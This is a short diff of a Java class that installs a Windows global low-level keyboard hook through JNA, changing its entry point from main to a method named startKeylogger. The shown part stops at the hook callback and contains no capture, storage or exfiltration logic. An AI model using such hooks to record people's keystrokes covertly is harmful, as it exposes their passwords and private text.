@@ -12,7 +12,7 @@ public class GlobalKeyListenerService {
     private static HHOOK hHook;
     private static final User32 user32 = User32.INSTANCE;
 
-    public static void main(String[] args) {
+    public void startKeylogger() {
         LowLevelKeyboardProc keyboardHook = new LowLevelKeyboardProc() {
             public LRESULT callback(int nCode, WPARAM wParam, KBDLLHOOKSTRUCT info) {
                 if (nCode >= 0) {
